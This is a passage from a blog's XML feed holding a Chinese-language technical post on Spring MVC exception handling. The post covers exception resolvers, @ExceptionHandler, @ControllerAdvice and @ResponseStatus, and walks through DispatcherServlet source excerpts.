<li><p><a href="http://design-patterns.readthedocs.io/zh_CN/latest/behavioral_patterns/observer.html" rel="external nofollow noopener noreferrer" target="_blank">观察者模式 — Graphic Design Patterns</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> guava </category>
            
        </categories>
        
        
        <tags>
            
            <tag> event-bus </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Spring MVC 中的异常处理]]></title>
      <url>http://qsli.github.io/2017/01/09/Spring-mvc-exception/</url>
      <content type="html"><![CDATA[<h2 id="Spring-MVC的异常处理"><a href="#Spring-MVC的异常处理" class="headerlink" title="Spring MVC的异常处理"></a>Spring MVC的异常处理</h2><p>Spring中的异常处理主要有两种方式，<em>一种</em>是实现<code>HandlerExceptionResolver</code>接口，</p>
<p>这个接口中只有一个方法<code>resolveException</code>，返回值是一个<code>ModelAndView</code>的对象; </p>
<p><em>另外一种</em>是使用<code>@ExceptionHandler</code>注解作用在方法上，注解的值来指定这个方法能处理的异常的类，</p>
<p>如果注解的值是空的，能处理的类以方法的参数为准。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HandlerExceptionResolver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Try to resolve the given exception that got thrown during handler execution,</span></span><br><span class="line"><span class="comment">     * returning a &#123;<span class="doctag">@link</span> ModelAndView&#125; that represents a specific error page if appropriate.</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;The returned &#123;<span class="doctag">@code</span> ModelAndView&#125; may be &#123;<span class="doctag">@linkplain</span> ModelAndView#isEmpty() empty&#125;</span></span><br><span class="line"><span class="comment">     * to indicate that the exception has been resolved successfully but that no view</span></span><br><span class="line"><span class="comment">     * should be rendered, for instance by setting a status code.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request current HTTP request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response current HTTP response</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handler the executed handler, or &#123;<span class="doctag">@code</span> null&#125; if none chosen at the</span></span><br><span class="line"><span class="comment">     * time of the exception (for example, if multipart resolution failed)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ex the exception that got thrown during handler execution</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> a corresponding &#123;<span class="doctag">@code</span> ModelAndView&#125; to forward to, or &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment">     * for default processing</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ModelAndView <span class="title">resolveException</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@ExceptionHandler</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @RequestMapping methods omitted ...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExceptionHandler</span>(IOException<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">ResponseEntity</span>&lt;<span class="title">String</span>&gt; <span class="title">handleIOException</span>(<span class="title">IOException</span> <span class="title">ex</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// prepare responseEntity</span></span><br><span class="line">        <span class="keyword">return</span> responseEntity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="异常相关的类"><a href="#异常相关的类" class="headerlink" title="异常相关的类"></a>异常相关的类</h3><blockquote class="pullquote mindmap"><p>#Spring MVC Exception</p>
<p>##HandlerExceptionResolver</p>
<p>###SimpleMappingExceptionResolver</p>
<p>###DefaultHandlerExceptionResolver</p>
<p>##@ExceptionHandler</p>
<p>###@ControllerAdvice</p>
<p>###ResponseEntityExceptionHandler</p>
<p>##Default Servlet Container Error Page</p>
<p>##@ResponseStatus</p>
<p>###ResponseStatusExceptionResolver</p>
</blockquote>
<h3 id="SimpleMappingExceptionResolver"><a href="#SimpleMappingExceptionResolver" class="headerlink" title="SimpleMappingExceptionResolver"></a><code>SimpleMappingExceptionResolver</code></h3><blockquote>
<p>The SimpleMappingExceptionResolver enables you to take the<br>class name of any exception that might be thrown and map it to a view name. </p>
</blockquote>
<p>这个Resolver可以将异常对应的类名映射到一个对应的view name上。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.handler.SimpleMappingExceptionResolver"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"exceptionMappings"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"com.howtodoinjava.demo.exception.AuthException"</span>&gt;</span></span><br><span class="line">                error/authExceptionView</span><br><span class="line">            <span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"defaultErrorView"</span> <span class="attr">value</span>=<span class="string">"error/genericView"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="DefaultHandlerExceptionResolver"><a href="#DefaultHandlerExceptionResolver" class="headerlink" title="DefaultHandlerExceptionResolver"></a><code>DefaultHandlerExceptionResolver</code></h3><blockquote>
<p>The DefaultHandlerExceptionResolver translates Spring MVC exceptions to specific error<br>status codes.</p>
</blockquote>
<p>这个Resolver的作用就是将Spring MVC产生的一些异常翻译成对应的http status code。Spring MVC中</p>
<p>默认注册了这个Resolver。</p>
<p>转换列表：</p>
<table>
<thead>
<tr>
<th>Exception</th>
<th>HTTP Status Code</th>
</tr>
</thead>
<tbody>
<tr>
<td>BindException</td>
<td>400 (Bad Request)</td>
</tr>
<tr>
<td>ConversionNotSupportedException</td>
<td>500 (Internal Server Error)</td>
</tr>
<tr>
<td>HttpMediaTypeNotAcceptableException</td>
<td>406 (Not Acceptable)</td>
</tr>
<tr>
<td>HttpMediaTypeNotSupportedException</td>
<td>415 (Unsupported Media Type)</td>
</tr>
<tr>
<td>HttpMessageNotReadableException</td>
<td>400 (Bad Request)</td>
</tr>
<tr>
<td>HttpMessageNotWritableException</td>
<td>500 (Internal Server Error)</td>
</tr>
<tr>
<td>HttpRequestMethodNotSupportedException</td>
<td>405 (Method Not Allowed)</td>
</tr>
<tr>
<td>MethodArgumentNotValidException</td>
<td>400 (Bad Request)</td>
</tr>
<tr>
<td>MissingPathVariableException</td>
<td>500 (Internal Server Error)</td>
</tr>
<tr>
<td>MissingServletRequestParameterException</td>
<td>400 (Bad Request)</td>
</tr>
<tr>
<td>MissingServletRequestPartException</td>
<td>400 (Bad Request)</td>
</tr>
<tr>
<td>NoHandlerFoundException</td>
<td>404 (Not Found)</td>
</tr>
<tr>
<td>NoSuchRequestHandlingMethodException</td>
<td>404 (Not Found)</td>
</tr>
</tbody>
</table>
<h3 id="ExceptionHandler和-ControllerAdvice"><a href="#ExceptionHandler和-ControllerAdvice" class="headerlink" title="@ExceptionHandler和@ControllerAdvice"></a>@ExceptionHandler和@ControllerAdvice</h3><p><code>@ExceptionHandler</code> 可以指定异常的处理类，<code>@ControllerAdvice</code>则可以实现全局的异常统一处理。</p>
<p>两者可配合使用，达到统一处理异常的效果。</p>
<blockquote>
<p>The @ControllerAdvice annotation is a component annotation allowing implementation classes<br>to be auto-detected through classpath scanning. It is automatically enabled when using the MVC<br>namespace or the MVC Java config.</p>
</blockquote>
<p><code>@ControllerAdvice</code>默认在Spring MVC的命名空间中启用。</p>
<blockquote>
<p>Classes annotated with @ControllerAdvice can contain @ExceptionHandler, @InitBinder,<br>and @ModelAttribute annotated methods, and these methods will apply to @RequestMapping<br>methods across all controller hierarchies as opposed to the controller hierarchy within which they are<br>declared.</p>
</blockquote>
<p><code>@ControllerAdvice</code>声明的异常处理方法默认对全局都是有效的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Target all Controllers annotated with @RestController</span></span><br><span class="line"><span class="meta">@ControllerAdvice</span>(annotations = RestController<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">AnnotationAdvice</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Target all Controllers within specific packages</span></span><br><span class="line"><span class="meta">@ControllerAdvice</span>(<span class="string">"org.example.controllers"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BasePackageAdvice</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Target all Controllers assignable to specific classes</span></span><br><span class="line"><span class="meta">@ControllerAdvice</span>(assignableTypes = &#123;ControllerInterface<span class="class">.<span class="keyword">class</span>, <span class="title">AbstractController</span>.<span class="title">class</span>&#125;)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">AssignableTypesAdvice</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>还有一个<code>@RestControllerAdvice</code>和<code>@ControllerAdvice</code>相似，只是假定<code>@ResponseBody</code>出现在<code>@ExceptionHandler</code>上</p>
<blockquote>
<p>@RestControllerAdvice is an alternative where @ExceptionHandler methods assume<br>@ResponseBody semantics by default.</p>
</blockquote>
<h3 id="ResponseEntityExceptionHandler"><a href="#ResponseEntityExceptionHandler" class="headerlink" title="ResponseEntityExceptionHandler"></a><code>ResponseEntityExceptionHandler</code></h3><p>如果你想使用<code>@ExceptionHandler</code>来处理异常的话， 你可以继承这个类。</p>
<p>这个类中定义好了一个异常处理的方法，来处理Spring MVC 的标准异常。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Provides handling for standard Spring MVC exceptions.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ex the target exception</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request the current request</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ExceptionHandler</span>(&#123;</span><br><span class="line">            NoSuchRequestHandlingMethodException<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">HttpRequestMethodNotSupportedException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">HttpMediaTypeNotSupportedException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">HttpMediaTypeNotAcceptableException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">MissingPathVariableException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">MissingServletRequestParameterException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">ServletRequestBindingException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">ConversionNotSupportedException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">TypeMismatchException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">HttpMessageNotReadableException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">HttpMessageNotWritableException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">MethodArgumentNotValidException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">MissingServletRequestPartException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">BindException</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">NoHandlerFoundException</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">        &#125;)</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">final</span> <span class="title">ResponseEntity</span>&lt;<span class="title">Object</span>&gt; <span class="title">handleException</span>(<span class="title">Exception</span> <span class="title">ex</span>, <span class="title">WebRequest</span> <span class="title">request</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            HttpHeaders headers = <span class="keyword">new</span> HttpHeaders();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> NoSuchRequestHandlingMethodException) &#123;</span><br><span class="line">                HttpStatus status = HttpStatus.NOT_FOUND;</span><br><span class="line">                <span class="keyword">return</span> handleNoSuchRequestHandlingMethod((NoSuchRequestHandlingMethodException) ex, headers, status, request);</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="ResponseStatus"><a href="#ResponseStatus" class="headerlink" title="@ResponseStatus"></a>@ResponseStatus</h3><p>用于在自定义异常，设置http的状态码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseStatus</span>(value=HttpStatus.NOT_FOUND, reason=<span class="string">"No such Order"</span>)  <span class="comment">// 404</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderNotFoundException</span> <span class="keyword">extends</span> <span class="title">RuntimeException</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Spring MVC 中默认开启了<code>ResponseStatusExceptionResolver</code>，这个Resolver会处理上面</p>
<p>设置的Http status code。</p>
<blockquote>
<p>A business exception can be annotated with @ResponseStatus. When the exception is raised, the<br>ResponseStatusExceptionResolver handles it by setting the status of the response accordingly.<br>By default the DispatcherServlet registers the ResponseStatusExceptionResolver and it is<br>available for use.</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> ModelAndView <span class="title">doResolveException</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">            Object handler, Exception ex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ResponseStatus responseStatus = AnnotatedElementUtils.findMergedAnnotation(ex.getClass(), ResponseStatus<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">if</span> (responseStatus != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> resolveResponseStatus(responseStatus, request, response, handler, ex);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception resolveEx) &#123;</span><br><span class="line">                logger.warn(<span class="string">"Handling of @ResponseStatus resulted in Exception"</span>, resolveEx);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ex.getCause() <span class="keyword">instanceof</span> Exception) &#123;</span><br><span class="line">            ex = (Exception) ex.getCause();</span><br><span class="line">            <span class="keyword">return</span> doResolveException(request, response, handler, ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>通过工具类拿到注解上的值，然后调用内部的<code>resolveResponseStatus</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> ModelAndView <span class="title">resolveResponseStatus</span><span class="params">(ResponseStatus responseStatus, HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> statusCode = responseStatus.code().value();</span><br><span class="line">        String reason = responseStatus.reason();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.messageSource != <span class="keyword">null</span>) &#123;</span><br><span class="line">            reason = <span class="keyword">this</span>.messageSource.getMessage(reason, <span class="keyword">null</span>, reason, LocaleContextHolder.getLocale());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.hasLength(reason)) &#123;</span><br><span class="line">            response.sendError(statusCode);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            response.sendError(statusCode, reason);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ModelAndView();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>最终将http status code 设置到reponse中。</p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>Spring MVC 的异常处理在<code>DispatcherServlet</code>的<code>doDispatch</code>方法中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doDispatch</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HttpServletRequest processedRequest = request;</span><br><span class="line">        HandlerExecutionChain mappedHandler = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">boolean</span> multipartRequestParsed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ModelAndView mv = <span class="keyword">null</span>;</span><br><span class="line">            Exception dispatchException = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//do Handle</span></span><br><span class="line">                ...</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                dispatchException = ex;</span><br><span class="line">            &#125;</span><br><span class="line">            processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            triggerAfterCompletion(processedRequest, response, mappedHandler, ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Error err) &#123;</span><br><span class="line">            triggerAfterCompletionWithError(processedRequest, response, mappedHandler, err);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//post process</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在内层的<code>try-catch</code>中有一个方法<code>processDispatchResult</code>, 在这个方法之前的catch块已经将处理过程可能出现的异常catch住了，并赋值给 <code>dispatchException</code>.</p>
<p>然后调用<code>processDispatchResult</code>分发给能处理这个异常的<code>ExceptionResolver</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle the result of handler selection and handler invocation, which is</span></span><br><span class="line"><span class="comment">     * either a ModelAndView or an Exception to be resolved to a ModelAndView.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processDispatchResult</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">            HandlerExecutionChain mappedHandler, ModelAndView mv, Exception exception)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> errorView = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (exception != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (exception <span class="keyword">instanceof</span> ModelAndViewDefiningException) &#123;</span><br><span class="line">                logger.debug(<span class="string">"ModelAndViewDefiningException encountered"</span>, exception);</span><br><span class="line">                mv = ((ModelAndViewDefiningException) exception).getModelAndView();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                Object handler = (mappedHandler != <span class="keyword">null</span> ? mappedHandler.getHandler() : <span class="keyword">null</span>);</span><br><span class="line">                mv = processHandlerException(request, response, handler, exception);</span><br><span class="line">                errorView = (mv != <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Did the handler return a view to render?</span></span><br><span class="line">        <span class="keyword">if</span> (mv != <span class="keyword">null</span> &amp;&amp; !mv.wasCleared()) &#123;</span><br><span class="line">            render(mv, request, response);</span><br><span class="line">            <span class="keyword">if</span> (errorView) &#123;</span><br><span class="line">                WebUtils.clearErrorRequestAttributes(request);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                logger.debug(<span class="string">"Null ModelAndView returned to DispatcherServlet with name '"</span> + getServletName() +</span><br><span class="line">                        <span class="string">"': assuming HandlerAdapter completed request handling"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) &#123;</span><br><span class="line">            <span class="comment">// Concurrent handling started during a forward</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mappedHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">            mappedHandler.triggerAfterCompletion(request, response, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> ModelAndView <span class="title">processHandlerException</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">            Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check registered HandlerExceptionResolvers...</span></span><br><span class="line">        ModelAndView exMv = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (HandlerExceptionResolver handlerExceptionResolver : <span class="keyword">this</span>.handlerExceptionResolvers) &#123;</span><br><span class="line">            exMv = handlerExceptionResolver.resolveException(request, response, handler, ex);</span><br><span class="line">            <span class="keyword">if</span> (exMv != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (exMv != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (exMv.isEmpty()) &#123;</span><br><span class="line">                request.setAttribute(EXCEPTION_ATTRIBUTE, ex);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// We might still need view name translation for a plain error model...</span></span><br><span class="line">            <span class="keyword">if</span> (!exMv.hasView()) &#123;</span><br><span class="line">                exMv.setViewName(getDefaultViewName(request));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                logger.debug(<span class="string">"Handler execution resulted in exception - forwarding to resolved error view: "</span> + exMv, ex);</span><br><span class="line">            &#125;</span><br><span class="line">            WebUtils.exposeErrorRequestAttributes(request, ex, getServletName());</span><br><span class="line">            <span class="keyword">return</span> exMv;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这个异常的处理和之前，查找handler的过程是一样的。</p>
<p>遍历所有已经注册的<code>HandlerExceptionResolver</code>, 找到第一个能处理的。</p>
